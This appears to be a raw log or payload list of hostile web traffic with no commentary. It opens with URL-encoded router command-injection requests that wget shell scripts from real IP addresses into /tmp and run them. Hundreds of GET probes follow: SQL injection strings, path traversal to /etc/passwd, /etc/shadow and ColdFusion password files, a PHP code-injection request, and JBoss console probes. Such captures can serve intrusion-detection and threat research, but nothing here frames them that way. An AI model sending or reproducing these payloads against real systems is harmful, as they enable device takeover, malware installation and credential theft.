
\
\
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%20%77%67%65%74%20%2d%4f%20%73%63%61%43%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%2e%73%68%3b%20%63%68%6d%6f%64%20%2b%78%20%73%63%61%43%2e%73%68%3b%20%2e%2f%73%63%61%43%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%20%77%67%65%74%20%2d%4f%20%73%63%61%43%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%32%2e%73%68%3b%20%63%68%6d%6f%64%20%2b%78%20%73%63%61%43%2e%73%68%3b%20%2e%2f%73%63%61%43%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%31%32%2e%31%38%33%2e%35%30%2e%32%32%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%32%31%38%2e%32%35%30%2e%32%32%36%2e%31%38%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%36%31%2e%36%2e%30%2e%31%39%30%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%27%23%21%2f%62%69%6e%2f%73%68%27%20%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%77%67%65%74%20%2d%4f%20%32%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%63%68%6d%6f%64%20%2b%78%20%32%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%2e%2f%32%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%31%2e%73%68%3b%2e%2f%31%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
a
Accept: */*\
Accept-Charset: GBK\,utf-8;q=0.7\,*;q=0.3\
Accept-Charset: ISO-8859-1\,utf-8;q=0.7\,*;q=0.7\
Accept-Encoding: deflate\, gzip\, identity\
Accept-Encoding: gzip\
GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties%00en HTTP/1.1\
GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties%00en HTTP/1.1\
GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties%00en HTTP/1.1\
GET /cgi-bin/base.php?rub=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/blank.php?h=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/Browse_Item_Details.asp?Store_Id=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/customerService.asp?TextID1=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/default.php?ki=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/dossier.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/enter.php?left=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/events.asp?ID=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/gallery.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/index_en.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/index.php?addr=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/index.php?configFile=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/index.php?cPath=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/index.php?pollname=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/index.php?where=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/info.php?home=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/info.php?o=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/main.php?loc=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/main.php?param=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd HTTP/1.1\
GET /cgi-bin/padrao.php?a=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/padrao.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/pagedisplay.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/pagina.php?pagina=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/path.php?path=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/ppdscgi.exe HTTP/1.0\
GET /cgi-bin/ppdscgi.exe HTTP/1.1\
GET /cgi-bin/principal.php?pag=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/prod_info.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/prodotti.php?idcategoria=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/product.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/sam._ HTTP/1.1\
GET /cgi-bin/shopreviewlist.asp?id=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/sitio.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/start.php?o=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/start.php?p=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/style.css HTTP/1.0\
GET /cgi-bin/view.php?u=%27%20OR%20sqlspider HTTP/1.1\
GET /cgi-bin/visadmin.exe HTTP/1.0\
GET /chisiamo.php?a=%27%20OR%20sqlspider HTTP/1.1\
GET /clanek.php4?id=%27%20OR%20sqlspider HTTP/1.1\
GET /clientaccesspolicy.xml HTTP/1.1\
GET //cmdownloads/?CMDsearch=%22%2ebase64_decode%28%22VlBRVlJHRkhUQU9TSlRJ%22%29%2e%22 HTTP/1.1\
GET /colunas.php?id_colunista=%27%20OR%20sqlspider HTTP/1.1\
GET /comersus_optReviewReadExec.asp?idProduct=%27%20OR%20sqlspider HTTP/1.1\
GET /components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=%27%20OR%20sqlspider HTTP/1.1\
GET /components/com_facileforms/facileforms.frame.php?ff_compath=%27%20OR%20sqlspider HTTP/1.1\
GET /components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=%27%20OR%20sqlspider HTTP/1.1\
GET /components/com_smf/smf.php?mosConfig_absolute_path=%27%20OR%20sqlspider HTTP/1.1\
GET /components/com_zoom/includes/database.php?mosConfig_absolute_path=%27%20OR%20sqlspider HTTP/1.1\
GET /config.php?_CCFG%5b_PKG_PATH_DBSE%5d=%27%20OR%20sqlspider HTTP/1.1\
GET /contact.asp?cartId=%27%20OR%20sqlspider HTTP/1.1\
GET /cpcommerce/_functions.php?prefix=%27%20OR%20sqlspider HTTP/1.1\
GET /crossdomain.xml HTTP/1.1\
GET /customerService.asp?TextID1=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?cont=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?eval=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?incl=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?ki=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?secao=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?showpage= HTTP/1.1\
GET /default.php?str=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?str= HTTP/1.1\
GET /default.php?t=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?x=%27%20OR%20sqlspider HTTP/1.1\
GET /default.php?y=%27%20OR%20sqlspider HTTP/1.1\
GET /demo/includes/init.php?user_inc=%27%20OR%20sqlspider HTTP/1.1\
GET /derniers_commentaires.php?rep=%27%20OR%20sqlspider HTTP/1.1\
GET /details.asp?BookID=%27%20OR%20sqlspider HTTP/1.1\
GET /details.asp?Service_ID=%27%20OR%20sqlspider HTTP/1.1\
GET /dossier.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /down%2A.php?lang=%27%20OR%20sqlspider HTTP/1.1\
GET /down%2A.php?second=%27%20OR%20sqlspider HTTP/1.1\
GET /down%2A.php?t=%27%20OR%20sqlspider HTTP/1.1\
GET /down%2A.php?texto=%27%20OR%20sqlspider HTTP/1.1\
GET /downloads_info.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /downloads_info.php?id= HTTP/1.1\
GET /emailproduct.asp?itemid=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?addr=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?base_dir=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?e=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?incl=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?itemnav=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?left=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?link=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?middle=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?module=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?play=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?pname=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?r=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?ref=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?sec=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?type=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?y=%27%20OR%20sqlspider HTTP/1.1\
GET /enter.php?y= HTTP/1.1\
GET /epgrec/%2Ainc%2A.php?str= HTTP/1.1\
GET /epgrec/base.php?middle= HTTP/1.1\
GET /epgrec/do-record.sh HTTP/1.1\
GET /epgrec/enter.php?itemnav= HTTP/1.1\
GET /epgrec/enter.php?open= HTTP/1.1\
GET /epgrec/general.php?addr= HTTP/1.1\
GET /epgrec/global.cgi HTTP/1.1\
GET /epgrec/head.php?str= HTTP/1.1\
GET /epgrec/hello.bat HTTP/1.1\
GET /epgrec/inicio.php?id= HTTP/1.1\
GET /epgrec/layout.php?opcion= HTTP/1.1\
GET /epgrec/path.php?nivel= HTTP/1.1\
GET /epgrec/preferences.ini HTTP/1.1\
GET /epgrec/press.php?mid= HTTP/1.1\
GET /epgrec/product_info.asp?item_id= HTTP/1.1\
GET /epgrec/show.php?*root*= HTTP/1.1\
GET /epgrec/standard.php?ref= HTTP/1.1\
GET /epgrec/sub%2A.php?mid= HTTP/1.1\
GET /epgrec/template.php?ref= HTTP/1.1\
GET /epgrec/view.php?pollname= HTTP/1.1\
GET /es/index.php?action=%27%20OR%20sqlspider HTTP/1.1\
GET /../../../../../../../etc/passwd HTTP/1.1\
GET /event.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /events.asp?ID=%27%20OR%20sqlspider HTTP/1.1\
GET /explorer.cfm HTTP/1.1\
GET /file.php?channel=%27%20OR%20sqlspider HTTP/1.1\
GET /file.php?doshow=%27%20OR%20sqlspider HTTP/1.1\
GET /file.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /file.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
GET /file.php?start=%27%20OR%20sqlspider HTTP/1.1\
GET /file.php?texto=%27%20OR%20sqlspider HTTP/1.1\
GET /file.php?where=%27%20OR%20sqlspider HTTP/1.1\
GET /folder.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /foto_index.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /fullDisplay.asp?item=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?action=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?disp=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?go=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?menue=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?phpbb_root_path=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?sp=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?thispage=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?tipo=%27%20OR%20sqlspider HTTP/1.1\
GET /gallery.php?y=%27%20OR%20sqlspider HTTP/1.1\
GET /general.php?inc=%27%20OR%20sqlspider HTTP/1.1\
GET /general.php?menu=%27%20OR%20sqlspider HTTP/1.1\
GET /general.php?menue=%27%20OR%20sqlspider HTTP/1.1\
GET /general.php?pre=%27%20OR%20sqlspider HTTP/1.1\
GET /general.php?sekce=%27%20OR%20sqlspider HTTP/1.1\
GET /general.php?var=%27%20OR%20sqlspider HTTP/1.1\
GET /general.php?xlink=%27%20OR%20sqlspider HTTP/1.1\
GET /.git/HEAD HTTP/1.1\
GET /head.php?incl=%27%20OR%20sqlspider HTTP/1.1\
GET /head.php?ki=%27%20OR%20sqlspider HTTP/1.1\
GET /head.php?mod=%27%20OR%20sqlspider HTTP/1.1\
GET /head.php?opcion=%27%20OR%20sqlspider HTTP/1.1\
GET /head.php?opcion= HTTP/1.1\
GET /head.php?ref=%27%20OR%20sqlspider HTTP/1.1\
GET /head.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
GET /head.php?str=%27%20OR%20sqlspider HTTP/1.1\
GET /help/../../etc/shadow HTTP/1.1\
GET /help.php?css_path=%27%20OR%20sqlspider HTTP/1.1\
GET /home.asp HTTP/1.1\
GET /homepage.php?rid=%27%20OR%20sqlspider HTTP/1.1\
GET /home.php?addr=%27%20OR%20sqlspider HTTP/1.1\
GET /home.php?b=%27%20OR%20sqlspider HTTP/1.1\
GET /home.php?channel=%27%20OR%20sqlspider HTTP/1.1\
GET /home.php?link=%27%20OR%20sqlspider HTTP/1.1\
GET /home.php?path=%27%20OR%20sqlspider HTTP/1.1\
GET /home.php?secao=%27%20OR%20sqlspider HTTP/1.1\
GET /htmltonuke.php?filnavn=%27%20OR%20sqlspider HTTP/1.1\
GET / HTTP/1.0
GET / HTTP/1.0\
GET / HTTP/1.1
GET / HTTP/1.1\
GET http://162.252.240.124:80/gw.php HTTP/1.1\
GET http://24x7-allrequestsallowed.com/?PHPSESSID=aab45f4f00143PWPJWTGYCMZJ%40%5B HTTP/1.1\
GET http://24x7-allrequestsallowed.com/?PHPSESSID=tt2adea600143PWPJWTGYCMZJ%40%5B HTTP/1.1\
GET http://51.254.206.142/httptest.php HTTP/1.1\
GET https://m.baidu.com/ HTTP/1.1\
GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1\
GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1\
GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1\
GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1\
GET HTTP://www.baidu.com/ HTTP/1.1\
GET http://www.baidu.com/robots.txt HTTP/1.1\
GET http://www.google.pl/search?q=wczasy&num=100&start=100 HTTP/1.1\
GET http://www.ip.cn HTTP/1.1\
GET http://www.wikipedia.org/ HTTP/1.1\
GET /inc/header.php/step_one.php?server_inc=%27%20OR%20sqlspider HTTP/1.1\
GET /include.php?index=%27%20OR%20sqlspider HTTP/1.1\
GET /include.php?path=%27%20OR%20sqlspider HTTP/1.1\
GET /include.php?sec=%27%20OR%20sqlspider HTTP/1.1\
GET /include.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
GET /includes/setup.php?phpc_root_path=%27%20OR%20sqlspider HTTP/1.1\
GET /include/write.php?dir=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?home=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?incl=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?nivel=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?pg=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?pr=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?pre=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?read=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?redirect=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?site=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?strona=%27%20OR%20sqlspider HTTP/1.1\
GET /index1.php?type=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?action=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?ki=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?load=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?loader=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?module=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?param=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?pre=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
GET /index2.php?type=%27%20OR%20sqlspider HTTP/1.1\
GET /index3.php?addr=%27%20OR%20sqlspider HTTP/1.1\
GET /index3.php?channel=%27%20OR%20sqlspider HTTP/1.1\
GET /index3.php?channel= HTTP/1.1\
GET /index3.php?chapter=%27%20OR%20sqlspider HTTP/1.1\
GET /index3.php?pageweb=%27%20OR%20sqlspider HTTP/1.1\
GET /index3.php?pref=%27%20OR%20sqlspider HTTP/1.1\
GET /index3.php?t=%27%20OR%20sqlspider HTTP/1.1\
GET /index_en.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /index.inc.php?PATH_Includes=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?addr=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?configFile=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?conteudo=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?cPath=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?data_id=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?disp=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?filename=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?filepath=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php HTTP/1.1\
GET /index.php?id_categoria=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?inc=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?inhalt=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?lang=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?nic=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?opcao=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?opcion=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?pagename=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?pg=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?pollname=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?_REQUEST=%27%20OR%20sqlspider&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
GET /index.php?_REQUEST=&GLOBALS=%27%20OR%20sqlspider&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=%27%20OR%20sqlspider&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content%27%20OR%20sqlspider&_REQUEST%5bItemid%5d=1 HTTP/1.1\
GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?sub=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?u=administrator%2fcomponents%2fcom_linkdirectory%2ftoolbar%2elinkdirectory%2ehtml%2ephp%3fmosConfig_absolute_path%3d%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?visualizar=%27%20OR%20sqlspider HTTP/1.1\
GET /index.php?where=%27%20OR%20sqlspider HTTP/1.1\
GET /info.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
GET /info.php?eval=%27%20OR%20sqlspider HTTP/1.1\
GET /info.php?header=%27%20OR%20sqlspider HTTP/1.1\
GET /info.php?home=%27%20OR%20sqlspider HTTP/1.1\
GET /info.php?ki=%27%20OR%20sqlspider HTTP/1.1\
GET /info.php?menue=%27%20OR%20sqlspider HTTP/1.1\
GET /info.php?o=%27%20OR%20sqlspider HTTP/1.1\
GET /informacion.php?info=%27%20OR%20sqlspider HTTP/1.1\
GET /invoker/JMXInvokerServlet HTTP/1.1\
GET /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1\
GET /jmx-console/ HTTP/1.1\
GET /layout.php?category=%27%20OR%20sqlspider HTTP/1.1\
GET /layout.php?choix=%27%20OR%20sqlspider HTTP/1.1\
GET /layout.php?goto=%27%20OR%20sqlspider HTTP/1.1\
GET /layout.php?numero=%27%20OR%20sqlspider HTTP/1.1\
GET /layout.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /learnmore.asp?cartID=%27%20OR%20sqlspider HTTP/1.1\
GET /Listadeparametros.html HTTP/1.1\
GET /loadpsb.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?goto=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?inc=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?j=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?loc=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?param=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?r=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?sayfa=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?type=%27%20OR%20sqlspider HTTP/1.1\
GET /main.php?xlink=%27%20OR%20sqlspider HTTP/1.1\
GET /manager/html HTTP/1.1\
